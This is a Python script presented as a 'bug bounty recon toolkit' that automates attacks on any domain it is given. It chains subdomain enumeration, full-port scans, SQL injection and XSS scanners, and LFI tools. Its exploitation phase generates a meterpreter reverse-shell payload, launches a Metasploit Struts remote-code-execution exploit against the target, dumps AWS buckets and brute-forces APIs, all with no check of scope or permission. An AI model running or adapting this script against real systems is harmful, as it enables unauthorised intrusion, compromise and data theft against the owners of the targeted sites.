# DirtyHeroes Recon Toolkit (Ultimate Edition)
# Author: Dirty Heroes 😈

import os
import sys
import subprocess
import shutil
import socket
import time
import json
import threading
import argparse
from datetime import datetime

# === ASCII BANNER ===
def banner():
    print(r"""
     ____       _ _        ____  _____ _____ 
    |  _ \ __ _(_) |_ ___ / ___|| ____|_   _|
    | |_) / _` | | __/ _ \\___ \|  _|   | |  
    |  __/ (_| | | ||  __/ ___) | |___  | |  
    |_|   \__,_|_|\__\___||____/|_____| |_|  
   DirtyHeroes | Bug Bounty Recon Toolkit
    """)

# === PATH SETUP ===
BASE_DIR = os.path.abspath(".")
TOOLS_DIR = os.path.join(BASE_DIR, "Results")
os.makedirs(TOOLS_DIR, exist_ok=True)

# === UTILS ===
def run(command, output_file, task_name):
    print(f"[+] Running {task_name}...")
    try:
        with open(output_file, "w") as out:
            subprocess.run(command, shell=True, stdout=out, stderr=subprocess.STDOUT, timeout=600)
        print(f"[✔] {task_name} complete: {output_file}")
    except Exception as e:
        print(f"[!] Error in {task_name}: {e}")

# === INPUT ===
def get_target(args):
    if args.domain:
        return args.domain
    url = input("[?] Enter target domain : ").strip()
    try:
        socket.gethostbyname(url)
        print(f"[✔] Domain resolved: {url}")
        return url
    except socket.gaierror:
        print("[✘] Invalid domain. Try again.")
        return get_target(args)

# === PHASES ===
def recon_phase(domain, outdir):
    recon_dir = os.path.join(outdir, "RECON")
    os.makedirs(recon_dir, exist_ok=True)

    run(f"subfinder -d {domain} -silent", os.path.join(recon_dir, "subfinder.txt"), "Subfinder")
    run(f"amass enum -passive -d {domain}", os.path.join(recon_dir, "amass_passive.txt"), "Amass Passive")
    run(f"assetfinder --subs-only {domain}", os.path.join(recon_dir, "assetfinder.txt"), "Assetfinder")
    run(f"cat {recon_dir}/subfinder.txt | httpx -silent", os.path.join(recon_dir, "httpx.txt"), "Httpx Live Hosts")
    run(f"gau {domain}", os.path.join(recon_dir, "gau.txt"), "GAU URLs")
    run(f"waybackurls {domain}", os.path.join(recon_dir, "waybackurls.txt"), "Waybackurls")
    run(f"paramspider -d {domain}", os.path.join(recon_dir, "paramspider.txt"), "Paramspider")
    run(f"arjun -u https://{domain} -o {recon_dir}/arjun.txt", os.path.join(recon_dir, "arjun.txt"), "Arjun")
    run(f"gf xss < {recon_dir}/gau.txt", os.path.join(recon_dir, "gf_xss.txt"), "GF XSS")
    run(f"gf lfi < {recon_dir}/gau.txt", os.path.join(recon_dir, "gf_lfi.txt"), "GF LFI")
    run(f"linkfinder -i {recon_dir}/gau.txt -o cli", os.path.join(recon_dir, "linkfinder.txt"), "LinkFinder")
    run(f"gobuster dir -u https://{domain} -w /usr/share/wordlists/dirb/common.txt -q", os.path.join(recon_dir, "gobuster.txt"), "Gobuster Dir")
    run(f"ffuf -u https://{domain}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40", os.path.join(recon_dir, "ffuf.txt"), "FFUF Fuzz")

def port_scan_phase(domain, outdir):
    scan_dir = os.path.join(outdir, "SCAN")
    os.makedirs(scan_dir, exist_ok=True)
    run(f"nmap -sV -A -T4 {domain}", os.path.join(scan_dir, "nmap.txt"), "Nmap Full Scan")
    run(f"masscan {domain} -p1-65535 --rate=1000", os.path.join(scan_dir, "masscan.txt"), "Masscan All Ports")
    run(f"wafw00f https://{domain}", os.path.join(scan_dir, "wafw00f.txt"), "WAF Detection")

def screenshot_phase(domain, outdir):
    screen_dir = os.path.join(outdir, "SCREENSHOTS")
    os.makedirs(screen_dir, exist_ok=True)
    run(f"eyewitness --web -f {outdir}/RECON/httpx.txt -d {screen_dir} --no-prompt", os.path.join(screen_dir, "eyewitness.log"), "EyeWitness Screenshots")
    run(f"cat {outdir}/RECON/httpx.txt | aquatone -out {screen_dir}", os.path.join(screen_dir, "aquatone.log"), "Aquatone Screenshots")

def vuln_scan_phase(domain, outdir):
    vuln_dir = os.path.join(outdir, "VULNERABILITIES")
    os.makedirs(vuln_dir, exist_ok=True)
    run(f"sqlmap -u https://{domain} --batch --crawl=1", os.path.join(vuln_dir, "sqlmap.txt"), "SQLMap Scan")
    run(f"dalfox url https://{domain} --output {vuln_dir}/dalfox.txt", os.path.join(vuln_dir, "dalfox.txt"), "Dalfox XSS Scan")
    run(f"xsstrike -u https://{domain}", os.path.join(vuln_dir, "xsstrike.txt"), "XSStrike XSS Tool")
    run(f"nikto -h https://{domain}", os.path.join(vuln_dir, "nikto.txt"), "Nikto Web Server Scan")
    run(f"python2 lfisuite.py --url https://{domain}", os.path.join(vuln_dir, "lfisuite.txt"), "LFISuite LFI Check")
    run(f"python2 fimap/fimap.py -u https://{domain}", os.path.join(vuln_dir, "fimap.txt"), "Fimap LFI Finder")
    run(f"oralyzer -l {outdir}/RECON/javascript_files.txt -o {vuln_dir}/oralyzer.txt", os.path.join(vuln_dir, "oralyzer.txt"), "Oralyzer JS Analyzer")

def exploitation_phase(domain, outdir):
    exploit_dir = os.path.join(outdir, "EXPLOIT")
    os.makedirs(exploit_dir, exist_ok=True)
    run(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > {exploit_dir}/payload.exe", os.path.join(exploit_dir, "msfvenom.txt"), "MSFVenom Payload Generation")
    run(f"git clone https://github.com/internetwache/GitTools.git {exploit_dir}/gittools", os.path.join(exploit_dir, "gitdumper.txt"), "GitDumper Tool")
    run(f"python3 Gopherus/gopherus.py", os.path.join(exploit_dir, "gopherus.txt"), "Gopherus SSRF Chain Generator")
    run(f"interactsh-client -o {exploit_dir}/interactsh_output.txt", os.path.join(exploit_dir, "interactsh.txt"), "Interactsh Out-of-Band Test")
    run(f"python3 CMSeek/cmseek.py -u {domain} --batch", os.path.join(exploit_dir, "cmseek.txt"), "CMSeek CMS Detector")
    run(f"kiterunner wordlist routes ~/SecLists/APIs/objects.txt -H host:{domain} -x 10 -o {exploit_dir}/kiterunner.txt", os.path.join(exploit_dir, "kiterunner.txt"), "Kiterunner API Bruteforce")
    run(f"python3 AWSBucketDump/AWSBucketDump.py -D buckets.txt -m --target {domain}", os.path.join(exploit_dir, "awsbucketdump.txt"), "AWS Bucket Dump")
    run(f"postman", os.path.join(exploit_dir, "postman.txt"), "Postman Launch (Manual)")
    run(f"msfconsole -q -x 'use exploit/multi/http/struts_dmi_rest_exec; set RHOSTS {domain}; run; exit'", os.path.join(exploit_dir, "msfconsole.txt"), "MSFConsole Exploit")

def zip_results(outdir):
    base_name = os.path.basename(outdir)
    archive_name = os.path.join(TOOLS_DIR, f"{base_name}.zip")
    print(f"[+] Creating zip archive: {archive_name}")
    shutil.make_archive(archive_name.replace('.zip', ''), 'zip', outdir)
    print(f"[✔] Results bundled at: {archive_name}")

# === MAIN ===
def main():
    parser = argparse.ArgumentParser(description="DirtyHeroes Bug Bounty Toolkit")
    parser.add_argument("--domain", help="Target domain (e.g., example.com)")
    parser.add_argument("--fast", action="store_true", help="Skip heavy scans for faster execution")
    parser.add_argument("--recon-only", action="store_true", help="Only run recon phase")
    parser.add_argument("--vuln-only", action="store_true", help="Only run vulnerability scanning")
    parser.add_argument("--exploit-only", action="store_true", help="Only run exploitation phase")
    parser.add_argument("--skip-zip", action="store_true", help="Do not zip the result folder")
    args = parser.parse_args()

    banner()
    target = get_target(args)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    outdir = os.path.join(TOOLS_DIR, f"{target}_{timestamp}")
    os.makedirs(outdir, exist_ok=True)

    if args.recon_only:
        recon_phase(target, outdir)
    elif args.vuln_only:
        vuln_scan_phase(target, outdir)
    elif args.exploit_only:
        exploitation_phase(target, outdir)
    else:
        recon_phase(target, outdir)
        if not args.fast:
            port_scan_phase(target, outdir)
            screenshot_phase(target, outdir)
        vuln_scan_phase(target, outdir)
        exploitation_phase(target, outdir)

    if not args.skip_zip:
        zip_results(outdir)

if __name__ == "__main__":
    main()
